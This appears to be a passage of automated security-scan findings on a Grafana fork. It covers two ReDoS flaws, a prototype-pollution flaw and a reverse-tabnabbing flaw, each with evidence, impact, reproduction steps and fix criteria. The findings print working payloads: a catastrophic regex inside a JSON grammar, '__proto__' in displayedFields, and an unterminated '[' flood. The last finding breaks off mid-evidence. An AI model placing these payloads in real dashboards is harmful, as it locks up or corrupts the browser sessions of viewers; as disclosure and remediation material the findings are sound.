## Evidence
1. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered sourcesContent webpack://prometheus/../packages/grafana-prometheus/src/querybuilder/parsingUtils.ts:33 defines `variableRegex = /\$(\w+)|\[\[([\s\S]+?)(?::(\w+))?\]\]|\${(\w+)...}/g`. The `[[` alternative's unbounded lazy `[\s\S]+?` can only be closed by `]]`; for each `[[` opener in an input with no later `]]` the backtracking engine extends the lazy loop one character at a time to end-of-string before failing, and the global `String.replace` then retries at the next position, so `replaceVariables()` (lines 39-62) costs ~n^2/2 steps on an n-byte expression of repeated `[`. The lazy quantifier does not make the scan linear. `returnVariables()` (lines 74-78), `/__V_(\d)__(.+?)__V__(?:__F__(\w+)__F__)?/g`, is quadratic in the same way on repeated `__V_0__` without `__V__`, and `getString()` (86-91) applies it to every syntax-node substring including the top node. This is the code the fix must change.
2. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   querybuilder/parsing.ts:63-66 `buildVisualQueryFromString(expr)` calls `replaceBuiltInVariable(expr)` then `replaceVariables(expr)` on the whole PromQL expression before lezer parsing, and afterwards `getString()` -> `returnVariables()` per node.
3. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   querybuilder/QueryPatternsModal.tsx:35-44 computes `useMemo(() => buildVisualQueryFromString(query.expr ?? ''), [query.expr])` in the component body before any early return, and querybuilder/components/PromQueryEditorSelector.tsx:117-125 renders `<QueryPatternsModal query={query} .../>` unconditionally (`isOpen` only hides the modal), so the Prometheus query editor runs the quadratic regex over the current `expr` on first render with no user action. components/PromQueryEditorByApp.tsx:14-18 routes every app except CloudAlerting to PromQueryEditorSelector; querybuilder/components/PromQueryBuilderContainer.tsx:36-44 repeats the parse in a useEffect whenever the editor is in Builder mode.
4. [public/app/features/explore/hooks/useStateSync/migrators/v1.ts:31–33](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/migrators/v1.ts#L31-L33)
   The Explore `panes` URL parameter is `JSON.parse`d (line 33) and each pane's `queries` array, including each query's `expr`, is copied verbatim by `applyDefaults` (lines 100-113) with no length or content check.
5. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:43–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L43-L56)
   On Explore init the URL state's `queries` (only refIds de-duplicated by `withUniqueRefIds`, and `getQueryFilter` at internal.utils.ts:118-120 keeps queries with no datasource ref) become the pane's queries; `getPaneDatasource` (internal.utils.ts:54-100) falls back to the last-used or default datasource when the URL names none or an unknown one, so a link-sender need not know a datasource uid when Prometheus is the default.
6. [public/app/features/query/components/QueryEditorRow.tsx:252–270](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/query/components/QueryEditorRow.tsx#L252-L270)
   Explore's QueryRows -> QueryEditorRows -> QueryEditorRow mounts the datasource plugin's `components.QueryEditor` (`PromQueryEditorByApp`, registered in the plugin's module.ts via `setQueryEditor`) with `query={query}` straight from pane state, linking the attacker-crafted `/explore?panes=...` URL to the sink.
7. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Dashboard route (Editor -> Viewer, no editor UI): src/datasource.ts:72-73 `PrometheusDatasource extends DataSourceWithBackend` and `query()` (473-494) calls `super.query`, which invokes `applyTemplateVariables(target, scopedVars, filters)` (720-746); when ad-hoc filters are present, `enhanceExprWithAdHocFilters` (695-709) reduces each filter through `addLabelToQuery`, and src/add_label_to_query.ts:44-57 `getVectorSelectorPositions` calls `buildVisualQueryFromString(query.substring(from,to))` for every VectorSelector node. The quadratic scan therefore runs over whatever text lies inside a VectorSelector, so the Editor places the payload in a label-matcher string literal, e.g. `up{job="[[[[...(hundreds of KB)..."}` — bare `[` text alone produces no VectorSelector and returns early. `interpolateVariablesInQueries` (611-630) reaches the same function. src/language_provider.ts:446-460 `populateMatchParamsFromQueries` parses every query's whole `expr` when the editor fetches metric metadata.
8. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/runtime DataSourceWithBackend.ts:201 maps each target through `this.applyTemplateVariables(q, request.scopedVars, request.filters)` on every backend query, so a dashboard's ad-hoc filter variable (bound to the Prometheus datasource, with at least one filter) drives the dashboard route in every Viewer's browser on each query run, with no URL-length bound on the saved panel expression.
9. [data/plugins-bundled/prometheus/module.js](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js) (whole file)
   The shipped minified bundle contains both regexes verbatim (`[\s\S]+?)(?::(\w+))?\]\]` and `/__V_(\d)__(.+?)__V__(?:__F__(\w+)__F__)?/g`), confirming the recovered source matches the artifact loaded for every Prometheus datasource.
10. [public/app/features/variables/utils.ts:32](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/variables/utils.ts#L32)
   Core's template-variable regex bounds the `[[...]]` capture with `(\w+?)`, which fails immediately on a non-word character and is linear; the plugin's copy widened it to `([\s\S]+?)`, introducing the super-linear behaviour. The preceding core `templateSrv.replace` on the dashboard route is therefore unaffected and leaves the `[[[[` payload intact.

## Impact
The regex runs synchronously on the browser main thread; the victim's Grafana tab is unresponsive for tens of seconds to minutes and the work recurs on each render or query run of the same URL/dashboard. No data is disclosed or modified and the server is unaffected, so the impact is limited to the victim's session (availability LOW).

## Reproduction steps
1. Attacker builds a PromQL `expr` of hundreds of KB of `[` (or `__V_0__`) with no terminator. Delivery A: an Explore link (`/explore?panes=...`) naming any Prometheus datasource or none (fallback to default); the victim is any logged-in user with Explore access who opens it; QueryPatternsModal's useMemo runs replaceVariables on mount. Delivery B: an Editor saves the payload inside a label-matcher string literal of a dashboard panel expression together with an ad-hoc filter variable bound to the datasource; every Viewer's query run calls addLabelToQuery -> buildVisualQueryFromString on the VectorSelector substring. Requires a configured Prometheus datasource (AT:PRESENT); no security mechanism must be defeated.

## Recommended fix
1. `variableRegex` and the `returnVariables` regex in the Prometheus plugin's querybuilder/parsingUtils.ts use unbounded lazy repetitions (`[\s\S]+?`, `.+?`) that must be closed by a later delimiter, so a global scan over attacker-chosen query text is quadratic; the Loki plugin shares the same copy. Fix criteria: Placeholder detection and restoration must run in time linear in the expression length regardless of content (e.g. bound the `[[...]]` and `__V_..__V__` captures to the character class core uses, `\w+?`, or tokenise with a single forward pass), in both the Prometheus and Loki copies. Verify that a 1 MB expression of repeated `[` (and of repeated `__V_0__`, and one wrapped in a label-matcher string) parses in the query editor and in applyTemplateVariables without measurable delay.
2. PromQueryEditorSelector renders QueryPatternsModal unconditionally and the modal eagerly parses `query.expr` in a useMemo even while closed, so URL-supplied query text is parsed on mount before the user interacts. Fix criteria: Expression parsing for the patterns modal should not run until the modal is opened (or should be bounded by an input-size check), so that merely loading an Explore URL does not execute parsing over an arbitrarily long attacker-supplied expression.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256410

---

# Logs panel grammar option lets Editors compile arbitrary regex via Prism greedy rebuild (viewer ReDoS)

## Details
The Logs panel exposes a persisted panel option `grammar` (panelcfg.gen.ts:24, typed `unknown`) that is meant to carry a Prism grammar for custom syntax highlighting. LogsPanel.tsx:510 forwards it to `LogList` after only `isGrammar()` (types.ts:74-76), which merely checks for a non-null, non-array object. The object comes from the saved dashboard JSON, so every value in it is JSON (strings, numbers, nested objects) rather than `RegExp`, yet LogList passes it unchanged to `preProcessLogs` (LogList.tsx:383-396); `LogListModel` stores it (processing.ts:113) and spreads it into `Prism.tokenize(body, {...extraGrammar, ...this._grammar})` (processing.ts:204, 217) for every rendered log line, synchronously during React render.

The bundled prismjs (recovered from public/build/7606.*.js.map, matchGrammar lines 941-944) contains the gadget that turns this into regex injection: when a token has `greedy: true` and `pattern.global` is falsy, Prism rebuilds the pattern with `RegExp(patternObj.pattern.source, flags + 'g')`. With a JSON token such as

```json
"grammar": { "x": { "greedy": true, "pattern": { "source": "(.+)+\\u0000" } } }
```

`pattern.source` is the attacker's string, `toString()` yields '[object Object]' (flags ''), and Prism compiles and executes `/(.+)+\u0000/g` against each line via `pattern.exec(text)` with no complexity bound, time limit, or allow-list. A catastrophic pattern that cannot match (e.g. `(.+)+\u0000`, `(\w+\s?)*$`) backtracks exponentially in the line length, blocking the main thread for every viewer of the dashboard as soon as the panel renders; the token cache is rebuilt on every search/collapse/option change so the cost recurs. Tokens without `greedy` whose pattern is any JSON value instead throw `TypeError: pattern.exec is not a function` from inside render (a panel crash), which is the lesser effect.

Attacker: a dashboard Editor (adversary 3) saves a Logs panel with the `grammar` option above (via panel JSON editing or the dashboard JSON model) backed by any query that yields a time+string frame of ≥1 row — a Loki/Elasticsearch/TestData query, or even the always-present `-- Grafana --` random-walk query plus a "Convert field type" transformation. Victims: every Viewer/Admin (and anonymous/public-dashboard visitor) who opens the dashboard; wrapLogMessage and syntaxHighlighting defaults (module.tsx:69; LogList.tsx:176) leave highlighting on.

This is a different source and trust decision from the verified records at nearby code: logs-searchwords-regex-redos covers datasource-meta `searchWords` compiled in grammar.ts:65 (requires a Loki `|~` filter), and logs-grammar-quadratic-regex-long-tokens covers Grafana's own built-in patterns. Here the regex arrives through the panel option, works with any datasource, needs no RE2-compatibility, and the responsible check is the `isGrammar` type guard rather than grammar.ts. The `highlightedBody` HTML getter (processing.ts:187-196, Prism.highlight whose output puts the grammar key unescaped into a class attribute) has no consumer in public/app, so no HTML-injection impact is claimed.

Dependency assumptions: prismjs as bundled behaves as the recovered source shows (confirmed from the map; version banner absent, consistent with 1.29/1.30 core); browser RegExp engines are backtracking engines without a linear-time fallback, their standard behaviour.

## Evidence
1. [public/app/plugins/panel/logs/types.ts:74–76](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logs/types.ts#L74-L76)
   isGrammar() accepts any non-null, non-array object: `grammar != null && typeof grammar === 'object' && !Array.isArray(grammar)`. It never checks that token `pattern` values are RegExp instances, so a plain JSON object deserialized from the saved dashboard passes as a Prism Grammar. This is the check the fix must change.
2. [public/app/plugins/panel/logs/LogsPanel.tsx:510](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logs/LogsPanel.tsx#L510)
   `grammar={isGrammar(grammar) ? grammar : undefined}` hands the dashboard-JSON `options.grammar` object (destructured from `options` at line 170) to LogList on every render for every viewer. The doc comment at lines 134-135 describes it as a `Grammar` for in-process callers, yet it is a persisted panel option.
3. [public/app/features/logs/components/panel/processing.ts:198–207](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/processing.ts#L198-L207)
   LogListModel stores the option verbatim (`this._grammar = grammar`, line 113) and highlightedBodyTokens runs `Prism.tokenize(body, { ...extraGrammar, ...this._grammar })` synchronously on the React render path for every visible row; highlightedLogAttributesTokens (209-220) does the same for OTel attributes. The spread is shallow, so Prism mutates and executes the Editor's token objects themselves. The token cache is cleared on every search/collapse change (275-291), so the cost recurs.
4. [public/app/features/logs/components/panel/LogList.tsx:381–396](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogList.tsx#L381-L396)
   preProcessLogs(logs, {...}, grammar) runs in an effect on every data/option change, attaching the custom grammar to every LogListModel; LogLine.tsx LogLineBody (lines 477-498) renders `log.highlightedBodyTokens` whenever syntaxHighlighting is on (default true at line 176) and the line has no ANSI codes.
5. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered prismjs core (webpack://grafana/./node_modules/prismjs/prism.js, matchGrammar lines 941-948): `if (greedy && !patternObj.pattern.global) { var flags = patternObj.pattern.toString().match(/[imsuy]*$/)[0]; patternObj.pattern = RegExp(patternObj.pattern.source, flags + 'g'); } var pattern = patternObj.pattern || patternObj;`. For a JSON token `{ greedy: true, pattern: { source: '<regex>' } }`, `.global` is undefined, `.toString()` is '[object Object]' (flags ''), and `RegExp('<regex>', 'g')` compiles the Editor's string into a real RegExp that matchPattern (lines 895-905: `pattern.lastIndex = pos; pattern.exec(text)`) executes against the full line text with no complexity bound. The rebuild runs before matchPattern, so the executed object is always a genuine RegExp; a non-greedy token with a non-RegExp pattern instead throws `pattern.exec is not a function` inside render (panel crash, the lesser effect).
6. [public/app/plugins/panel/logs/panelcfg.cue:65](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logs/panelcfg.cue#L65)
   `grammar?: _` in the panel's persisted options schema: the value is typed as any, so the generated Options interface (panelcfg.gen.ts:24, `grammar?: unknown`) and any schema validation of saved dashboard JSON accept an arbitrary JSON object here.
7. [public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts:486](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts#L486)
   `options: panel.options ?? {}` copies the saved dashboard panel's options object into VizPanel state unchanged; the plugin-defaults merge (getPanelOptionsWithDefaults, recovered from public/build/6540.*.js.map, a lodash mergeWith over plugin.defaults and currentOptions) preserves unknown keys, so an Editor-authored `grammar` object reaches LogsPanel's `options` as plain mutable JSON.

## Impact
The victim's browser tab blocks on exponential regex backtracking every time the panel renders, re-triggering on reload or any search/collapse change; the dashboard (and the whole Grafana SPA tab) becomes unusable until the tab is killed. No data is read or modified. The loss is confined to the victim's session rather than the server, hence availability LOW, consistent with the sibling ReDoS records.

## Reproduction steps
1. An Editor saves a dashboard whose Logs panel has `options.grammar = { x: { greedy: true, pattern: { source: '(.+)+\u0000' } } }` and any query/transformation producing a time+string frame with at least one row. When a Viewer or Admin opens the dashboard, LogsPanel passes the object through isGrammar, LogList attaches it to each LogListModel, and Prism's greedy branch compiles the attacker's source into a RegExp and executes it against each rendered line on the main thread; no security mechanism stands in the way and the result is deterministic. No deployment condition outside the attacker's control is needed (the built-in Grafana datasource plus a convert-field-type transformation suffices), so AT:NONE; the victim only has to open the dashboard (UI:PASSIVE).

## Recommended fix
1. isGrammar() (types.ts:74) treats any plain object from dashboard JSON as a trusted Prism Grammar, and LogsPanel/LogList forward it verbatim into Prism.tokenize, where Prism's greedy-pattern rebuild compiles `pattern.source` strings from that JSON into executable regular expressions. Fix criteria: A grammar taken from panel options must not be able to introduce attacker-authored regular expressions or non-RegExp pattern values into Prism: either drop the persisted `grammar` option from dashboard JSON (accept it only from in-process callers that pass real RegExp instances) or validate it structurally — every token's `pattern` must be a RegExp instance (or a string compiled by Grafana against a bounded-complexity allow-list) and nested `inside`/`rest` objects validated recursively. Verify by saving a panel with `grammar: { x: { greedy: true, pattern: { source: '(.+)+\u0000' } } }` and confirming the panel renders promptly with default highlighting and no RegExp is created from the option.
2. processing.ts runs Prism.tokenize with the merged grammar synchronously on the render path with no cap on per-line cost, so any super-linear pattern (from this option or any other source) stalls the UI thread. Fix criteria: Highlighting should degrade rather than hang: bound the text length passed to Prism independent of wrap/collapse state and/or run tokenization off the main thread with a time budget, falling back to plain text. Verify that a pathological grammar or line leaves the dashboard responsive.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256405

---

# Logs table panel displayedFields option pollutes Object.prototype via buildColumnsWithMeta

## Details
The Logs Table panel (`logstable`) restores its column selection from the saved panel option `options.displayedFields`. `LogsTable.tsx:318` passes `getDisplayedFields(options, …)` — the option verbatim (`getDisplayedFields.ts:6-7`) — into `LogsTableFields`, whose effect (`LogsTableFields.tsx:101-118`) calls `buildColumnsWithMeta` whenever the frame or the option changes. That function builds `pendingLabelState` as an ordinary object and then does:

```ts
displayedFields.forEach((fieldName, idx) => {
  if (pendingLabelState[fieldName]) {
    pendingLabelState[fieldName].active = true;
    pendingLabelState[fieldName].index = idx;
  }
```

With `displayedFields` containing `"__proto__"`, `pendingLabelState["__proto__"]` is `Object.prototype`, so `Object.prototype.active = true` and `Object.prototype.index = <position>` are written in the browser of every user who renders the panel (`"constructor"` writes the same two properties onto the global `Object` function). Nothing on the path filters the names and there is no `Object.hasOwn` guard. `useOrganizeFields` runs first, but its `indexByName['__proto__'] = idx` is a silent no-op, so the panel still renders when the attacker pads the array with real field names, e.g. `["timestamp", "body", "__proto__"]`.

Source: dashboard panel JSON. An Editor adds a panel of `type: "logstable"` (through the JSON model editor or the dashboards API — the type is hidden from the visualization picker by `hideFromList`, but `built_in_plugins.ts:96` registers it unconditionally, the chunk ships, and its `state: beta` is not subject to the documented `[panels] enable_alpha` gate) with `options.displayedFields` containing `"__proto__"` and any query returning a logs frame with rows (TestData `logs` scenario, Loki, …). Every Viewer or Admin who opens the dashboard — including anonymous or public-dashboard viewers — is affected with no interaction beyond opening it. The `logsTablePanelNG` feature flag gates only Explore's use of the table and the visualization suggestions, not rendering of a saved panel. Assumption (Go backend absent from the checkout): the server lists `logstable` in the boot-data `config.panels` map like every other non-alpha core panel, which the recovered `@grafana/runtime` panel-meta cache reads; if a deployment's backend omitted it, dashboards could not load the panel and the route would not hold.

Consequences for the rest of the SPA session (property names fixed to `active`/`index`, values `true`/small integer): `logFrameLabelsToLabels` (`features/logs/logsFrame.ts:43-60`) attaches phantom `active`/`index` labels to every log line; `queryIsEmpty` (`core/utils/query.ts:4-18`) reports every query non-empty; breadcrumbs and page tabs (`core/components/Breadcrumbs/utils.ts:37`, `Page/PageTabs.tsx:22`) treat every nav child as active; `for…in` loops that assign to the inherited primitive throw TypeErrors in the strict-mode bundles — the bar chart value-label draw hook (`plugins/panel/barchart/bars.ts:580-620`, default `showValue: Auto`), Mixed-datasource query batching (`plugins/datasource/mixed/MixedDataSource.ts:51-59`) and the candlestick panel (`plugins/panel/candlestick/CandlestickPanel.tsx:232-240`) — so those panels fail until a full reload. The sibling verified finding `explore-logs-table-url-columns-prototype-pollution` covers the legacy Explore `LogsTableWrap` sink; this record covers the new panel's `buildColumnsWithMeta` sink and the dashboard-authored source.

## Evidence
1. [public/app/plugins/panel/logstable/fieldSelector/buildColumnsWithMeta.ts:99–109](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logstable/fieldSelector/buildColumnsWithMeta.ts#L99-L109)
   `displayedFields.forEach((fieldName, idx) => { if (pendingLabelState[fieldName]) { pendingLabelState[fieldName].active = true; pendingLabelState[fieldName].index = idx; } ... })`. `pendingLabelState` is an ordinary object (`{}` at line 39 or `Object.fromEntries(labelCardinality)` at line 62), so `pendingLabelState['__proto__']` resolves to `Object.prototype` (truthy) and the two assignments write `Object.prototype.active = true` and `Object.prototype.index = idx`; `'constructor'` likewise writes onto the global `Object` function. No `Object.hasOwn`/allow-list guard; this is the line the fix must change.
2. [public/app/plugins/panel/logstable/fieldSelector/LogsTableFields.tsx:101–118](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logstable/fieldSelector/LogsTableFields.tsx#L101-L118)
   The effect calls `buildColumnsWithMeta(..., dataFrame, displayedFields ?? defaultDisplayedFields)` whenever the frame or displayedFields change; the hook is declared before the component's early return, so it runs on first mount with data, without any user interaction.
3. [public/app/plugins/panel/logstable/LogsTable.tsx:315–330](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logstable/LogsTable.tsx#L315-L330)
   `LogsTableFields` is rendered as soon as `renderTable` holds (frame parses as a logs frame, extract/organize transforms resolved) with `displayedFields={untransformDisplayedFields(getDisplayedFields(options, timeFieldName, levelFieldName))}`; `untransformDisplayedFields` (lines 138-149) only maps the body-field sentinel and passes every other string verbatim. Not gated by any option or feature flag.
4. [public/app/plugins/panel/logstable/options/getDisplayedFields.ts:5–9](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logstable/options/getDisplayedFields.ts#L5-L9)
   Returns `options.displayedFields` verbatim when non-empty. `options.displayedFields` is the `logstable` panel's saved JSON option (`panelcfg.gen.ts:18`, `Array<string>`), authored by whoever saves the dashboard; nothing validates the strings.
5. [public/app/features/plugins/built\_in\_plugins.ts:35–36](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/built_in_plugins.ts#L35-L36)
   The `logstable` module is registered as a core panel (`core:plugin/logstable`, line 96) unconditionally and ships as chunk `public/build/logsTablePanel.*.js`. Its `plugin.json` has `state: beta` (not subject to the documented `[panels] enable_alpha` gate) and `hideFromList: true`, which the recovered `@grafana/runtime` `getListedPanels` applies only to the visualization picker. The `logsTablePanelNG` flag (default false per the recovered `useFlagLogsTablePanelNG`) gates only Explore's table and the suggestions supplier (`suggestions.ts:28`), not dashboard rendering of a saved `type: "logstable"` panel.
6. [public/app/features/logs/logsFrame.ts:43–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/logsFrame.ts#L43-L60)
   Integrity gadget: `logFrameLabelsToLabels` iterates per-line label objects with `for…in` and no own-property check; with `Object.prototype.active === true` (non-string) it takes the serialization branch and emits phantom labels `active: "true"` / `index: "<idx>"` on every log line rendered in the session.
7. [public/app/plugins/panel/barchart/bars.ts:580–619](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/barchart/bars.ts#L580-L619)
   Availability gadget: the bar chart value-label `draw` hook (runs whenever `showValue !== Never`; default is `Auto`, `panelcfg.gen.ts:74`) iterates `labels` and `labels[didx]` with `for…in`, so the inherited key `active` yields `label === true`; in Auto mode `bbox == null` leads to `label.hidden = true` on a boolean primitive, a TypeError in the strict-mode bundle (`"use strict"` in `public/build/barChartPanel.*.js`), so every default-configured bar chart fails to draw until reload. `plugins/datasource/mixed/MixedDataSource.ts:51-59` (`getBatchesForQueries(true)` → `queries[0].datasource` throws) and `plugins/panel/candlestick/CandlestickPanel.tsx:232-240` (`field.config =` on a primitive) fail the same way.

## Impact
Property names are fixed (`active`, `index`) and values are `true`/an attacker-chosen small integer, so no data disclosure (C:N). Integrity LOW: client state is deterministically altered for the victim's session — phantom labels on every log line (`logsFrame.ts` for…in), every query reported non-empty, every nav child reported active, extra keys copied by lodash `merge`/`keysIn` consumers. Availability LOW: strict-mode `for…in` consumers that assign to the inherited primitive throw — the bar chart value-label draw hook (default `showValue: Auto`), Mixed-datasource query batching and the candlestick panel — so those panels are broken in every dashboard the victim views until a full page reload. The previously claimed heatmap gadget does not fire: `disp.fill.index` is an own key (`heatmap/utils.ts:500`) and shadows the prototype.

## Reproduction steps
1. An Editor saves a dashboard containing a `logstable` panel whose `displayedFields` option includes `"__proto__"`, backed by any logs query. When any Viewer or Admin opens the dashboard the panel renders, `buildColumnsWithMeta` runs in an effect and writes `Object.prototype.active`/`index`; no option, flag or validation stands in the way on a default deployment. Requires Editor privileges (PR:L) and a victim opening the dashboard (UI:P); no special conditions.

## Recommended fix
1. buildColumnsWithMeta indexes a plain object with option-supplied field names and mutates whatever it finds, so inherited properties such as `__proto__`/`constructor` are treated as columns and written to. Fix criteria: Column names from `displayedFields` must only affect own data properties of the column-meta store (`Object.hasOwn` check, a `Map`, or a null-prototype object). After the fix, rendering a logs table with `displayedFields: ['__proto__']` or `['constructor']` leaves `Object.prototype` and `Object` unchanged and simply logs the unknown field.
2. The panel accepts `options.displayedFields` from saved dashboard JSON without validating that each entry is a plain field name. Fix criteria: Validate `displayedFields` on ingest (array of strings, excluding prototype-sensitive keys, ideally restricted to names present in the frame) in `getDisplayedFields`/`LogsTable`, so downstream consumers never receive hostile keys.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256351

---

# One-click data links open Editor-authored URLs via window.open without noopener (reverse tabnabbing)

## Details
Data links on fields and canvas elements support a `oneClick` option: instead of listing the link in the tooltip or context menu, a single click on the visualization navigates directly. Two host-side implementations perform that navigation with `window.open(href, target)` and no window-features string: the canvas element runtime (public/app/features/canvas/runtime/element.tsx:989) and the uPlot TooltipPlugin2 used by the timeseries, barchart, candlestick, heatmap, histogram, state-timeline, status-history, trend and xychart panels (recovered @grafana/ui source in public/build/6540.a30454ce5fbe65a84f5f.js.map, TooltipPlugin2.tsx:398). Neither passes 'noopener'.

Per the HTML spec, `window.open(url, '_blank')` without the 'noopener' feature gives the new browsing context a live `window.opener`; the implicit-noopener behaviour modern browsers added applies to `<a target=_blank>` anchors only. conf/defaults.ini configures no Cross-Origin-Opener-Policy and the docs list none (assumption: the out-of-checkout Go server does not add one). So when the Editor sets the data link's `targetBlank` and `oneClick`, the cross-origin page opened by the Viewer's click can run `opener.location = 'https://look-alike/login'` at any later time, replacing the victim's still-authenticated Grafana tab with a phishing page while they look at the new tab (CWE-1022 reverse tabnabbing), and can postMessage to it.

Who authors the URL: the dashboard Editor, through the panel/element data-link editor (`url`, `targetBlank`, `oneClick` stored in dashboard JSON; getLinksSupplier copies them into the LinkModel as href/target/oneClick). `textUtil.sanitizeUrl` (via locationUtil.processUrl) blocks javascript:/data: but passes any http(s) host, so an external destination is allowed by design; the defect is that the one-click path hands that destination an opener. Who is the victim: any Viewer or Admin who clicks the chart series or canvas element in view mode (element.tsx:1105 binds the handler only when editing is disabled; TooltipPlugin2 fires on the plain click that would otherwise pin the tooltip), a routine interaction. The project's own convention severs the opener for the very same LinkModel when rendered by DataLinkButton (`rel="noreferrer"`) and in SpanDetailLinkButtons.tsx:317 (`window.open(href, '_blank', 'noopener,noreferrer')`); these two sinks are the exceptions. This crosses the Editor→Viewer boundary named in the threat model: a plain data link gives the Editor a one-shot navigation of the victim's tab or an opener-severed new tab, whereas this path gives the external page a persistent handle to navigate the authenticated Grafana tab after the victim has left it, which the sanctioned rendering denies.

Assumptions: @grafana/ui TooltipPlugin2 and @grafana/data getLinksSupplier behave as the shipped source map shows (these packages are not in the checkout); the server sends no COOP header. The ledger dismissal at element.tsx:989 (dismissed-element-989-c869) considered only the javascript:/data: scheme filter, not the opener relationship.

## Evidence
1. [public/app/features/canvas/runtime/element.tsx:989](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/canvas/runtime/element.tsx#L989)
